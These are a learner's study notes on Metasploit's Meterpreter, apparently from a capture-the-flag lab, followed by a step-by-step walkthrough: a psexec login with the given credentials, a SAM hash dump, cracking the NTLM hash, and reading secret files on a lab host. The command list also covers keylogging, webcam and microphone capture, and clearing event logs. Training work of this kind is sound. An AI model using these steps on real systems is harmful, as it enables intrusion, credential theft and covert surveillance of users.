Metaspoloit: Meterpreter

    * Metasploit payload, runs on target system and acts as an agent within command and control architecture.
    ** Meterpreter is ran on the target machine but is not installed on it!
    * It runs in memory (not disk), to avoid triggering antivirus scans!
    * Meterpreter is a process that runs on target RAM (Random Access Memory).

    * Avoids detection from network-based IPS (Intrusion Prevention System) and IDS (Intrusion Detection System).
    * Does this by encrypting the communication channel with server where Metasploit runs (attacker).
    * Encrypted TLS communication.
    * Some degree of stealth, however gets detected by major antivirus software.

    ** LOOKING FOR PROCESS ID? use [getpid ]        [ps]        Shows active processes.
    * Even checking DLLs (Dynamic Link Library), nothing obvious pops out. (no meterpreter.dll).
    
    METERPRETER FLAVOURS:
        * Remember,  two types of payloads in Metasploit are inline (also called single) and staged. 
        * Staged payloads:  [Initial part is installed (stager), requests rest of payload.]
        * Inline payloads:  [Sent in one step.]
        * Meterpreter has the same.

        ** Meterpreter has a large number of version to use based on the target.

        List them with MSFVENOM:
        [
            msfvenom --list payloads | grep meterpreter
        ]
            The list will show Meterpreter versions available for the following platforms;
                * Android
                * Apple iOS
                * Java
                * Linux
                * OSX
                * PHP
                * Python
                * Windows

        DECISION? Based on "TARGET OS, COMPONENTS ON TARGET (Pyhton, PHP etc.), NETWORK CONNECTION (raw TCP allowed?)"
        * Once inside Meterpreter prompt, use [help] to list commands.

        ** METERPRETER PROVIDES 3 TYPES OF TOOLS:
                1. Built-in commands
                2. Meterpreter tools
                3. Meterpreter scripting

        ** METERPRETER COMMANDS CATEGORIES:
                * Core commands
                * File system commands
                * Networking commands
                * System commands
                * User interface commands
                * Webcam commands
                * Audio output commands
                * Elevate commands
                * Password database commands
                * Timestomp commands

        ***** "CORE METERPRETER COMMANDS:"
                [
                * background: Backgrounds the current session
                * exit: Terminate the Meterpreter session
                * guid: Get the session GUID (Globally Unique Identifier)
                * help: Displays the help menu
                * info: Displays information about a Post module
                * irb: Opens an interactive Ruby shell on the current session
                * load: Loads one or more Meterpreter extensions
                * migrate: Allows you to migrate Meterpreter to another process
                * run: Executes a Meterpreter script or Post module
                * sessions: Quickly switch to another session
                ]

            "File system commands"
                [
                * cd: Will change directory
                * ls: Will list files in the current directory (dir will also work)
                * pwd: Prints the current working directory
                * edit: will allow you to edit a file
                * cat: Will show the contents of a file to the screen
                * rm: Will delete the specified file
                * search: Will search for files
                * upload: Will upload a file or directory
                * download: Will download a file or directory
                ]

            "Networking commands"
                [
                * arp: Displays the host ARP (Address Resolution Protocol) cache
                * ifconfig: Displays network interfaces available on the target system
                * netstat: Displays the network connections
                * portfwd: Forwards a local port to a remote service
                * route: Allows you to view and modify the routing table
                ]
            "System commands"
                [
                clearev: Clears the event logs
                execute: Executes a command
                getpid: Shows the current process identifier
                getuid: Shows the user that Meterpreter is running as
                kill: Terminates a process
                pkill: Terminates processes by name
                ps: Lists running processes
                reboot: Reboots the remote computer
                shell: Drops into a system command shell
                shutdown: Shuts down the remote computer
                sysinfo: Gets information about the remote system, such as OS
                ]

            "Others Commands (these will be listed under different menu categories in the help menu)"
                [
                idletime: Returns the number of seconds the remote user has been idle
                keyscan_dump: Dumps the keystroke buffer
                keyscan_start: Starts capturing keystrokes
                keyscan_stop: Stops capturing keystrokes
                screenshare: Allows you to watch the remote user's desktop in real time
                screenshot: Grabs a screenshot of the interactive desktop
                record_mic: Records audio from the default microphone for X seconds
                webcam_chat: Starts a video chat
                webcam_list: Lists webcams
                webcam_snap: Takes a snapshot from the specified webcam
                webcam_stream: Plays a video stream from the specified webcam
                getsystem: Attempts to elevate your privilege to that of local system
                hashdump: Dumps the contents of the SAM database
                ]

        POST EXPLOITATION:
            * METERPRETER has lots of useful commands for post exploitation.
        
                [help]              Lists commands available
                [getuid]            Display user info, hint at privileges.
                [ps]                List running processes. Shows PID column
                [migrate PID]           Helps meterpreter interact with process

                **Example of migration:
                    - Note word processor running on target (notepad), we migrate to it in order to capture keystrokes.
                    - keyscan_start, keyscan_stop, and keyscan_dump used as keylogger commands!

                [keyscan_start]  [keyscan_stop], and [keyscan_dump]     KEYLOGGER
                [hashdump]          List contents of SAM (Security Account Manager), DB STORES USER PASSWORDS!
                                    These passwords are stored in the NTLM (New Technology LAN Manager) format.

                [search]            Useful to locate files, e.g flag.txt
                [shell]             Opens a regular command-line shell on target. 
                    [CTR + Z]       Leave command-line shell, back to Meterpreter.


        POST EXPOLOITATION CHALLENGE:
            "GOALS that Meterpreter helps with:"
                * Gathering further information about the target system.
                * Looking for interesting files, user credentials, additional network interfaces, and generally interesting information on the target system.
                * Privilege escalation.
                * Lateral movement.

            ** Want to attack SMB (Server Message Block)
            * using exploit/windows/smb/psexec      u: ballen   p: Password1
            target "10.10.59.228"



    CHALLENGE STEPS:
        1. Establish SMB exploit, find name of PC.
        [
            use windows/smb/psexec              Chosen exploit
            setg 10.10.59.228                   Set global target IP
            set SMBUser ballen                  Set username
            set SMBPass Password1               Set pass
            run                                 Run exploit
            background                          Background current session
            sessions -i 1                       Select backgrounded session
            
            shell                               Opens CMD prompt on target
            hostname                            shows name of PC!
            "ACME-TEST"
        ]

        2.  Find domain name
        [
            shell                               Opens CMD prompt on target
            echo %USERDOMAIN%                   shows domain
            "FLASH"
        ]

        3.  Find name of the share likely created by user
        [
            background                              Background the current meterpreter session
            use post/windows/gather/enum_shares     Module to enumerate shares.
            sessions                                Note number for meterpreter (1)
            options                                 List options for enum_shares
            set SESSION 1                           Set session to run enum_shares module on (meterpreter)
            run                                     Execute module
            "post/windows/gather/enum_shares"
        ]

        4.  What is the NTLM hash of the jchambers user?
        [
            back                                Leaves current module (enum_shares)
            sessions                            show sessions
            sessions -i 1                       Start interaction with meterpreter session
            options                             List commands
            hashdump                            Dumps the SAM (Secure Account Manager) database contents
            "jchambers:1114:aad3b435b51404eeaad3b435b51404ee:69596c7aa1e8daee17f8e78870e25a5c:::"
            ...where [user:jchambers] [1114: RID] [aad3b435b51404eeaad3b435b51404ee: LM hash] [69596c7aa1e8daee17f8e78870e25a5c: NTLM hash!]
            Answer:             "69596c7aa1e8daee17f8e78870e25a5c"   
        ]

        5.  What is the Plaintext password? (Previous NTLM hash in plaintext)
        [
            navigate to https://ntlm.pw/            This database contains lots of NTLM entries
            "Trustno1"
        ]

        6.  Where is the "secrets.txt"  file located? 
        [
            sessions -i 1                           Go back to meterpreter session
            search -f secrets.txt                   Search for the file
            "c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt"
        ]

        7.  What is the Twitter password revealed in the "secrets.txt" file?
        [
            download "c:\\Program Files (x86)\\Windows Multimedia Platform\\secrets.txt"        Download the file
            edit "c:\\Program Files (x86)\\Windows Multimedia Platform\\secrets.txt"            NOTE DOUBLE SLASHES!
            :qa (ENTER)                             Exit editor
            Answer:         "KDSvbsw3849!"
        ]

        8.  
        [
            search -f realsecret.txt                            Search for file location
            edit "c:\\inetpub\\wwwroot\\realsecret.txt"         NOTE DOUBLE SLASHES!
            qa (ENTER)                                          Exit editor
            Answer:         "The Flash is the fastest man alive"
        ]